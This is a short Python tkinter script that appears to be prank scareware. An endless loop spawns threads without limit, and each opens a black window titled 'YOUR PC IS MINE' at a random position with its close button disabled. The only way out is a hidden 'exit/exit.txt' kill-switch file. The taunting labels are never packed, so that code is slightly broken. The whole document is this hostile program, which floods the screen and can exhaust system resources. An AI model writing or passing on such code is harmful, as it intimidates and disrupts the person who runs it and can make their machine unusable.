from tkinter import*
import tkinter as tk
import faulthandler; faulthandler.enable()
import threading
import time
import random
import sys, os

def disable_event():
    pass

def move_window():
    root = Tk()
    root.title('YOUR PC IS MINE')
    root.attributes('-toolwindow', True)

    x = random.randint(0, 999)
    y = random.randint(0, 999)
    root.resizable(0,0)
    root.geometry(f'235x200+{x}+{y}')
    root.configure(background='black')

    Label(root, text='YOUR PC IS MINE', fg='white', font=('Terminal'))

    Label(root, text='You stupid lol', fg='red', font=('Terminal'))

    root.protocol("WM_DELETE_WINDOW", disable_event)

    
    root.update()
    if os.path.isfile("exit/exit.txt"):
        print('Exit Now')
        os._exit(0)
    import time
    time.sleep(2)
    exit()

#if __name__ == "__main__":
while True:
    thread = threading.Thread(target=move_window)
    thread.start()
        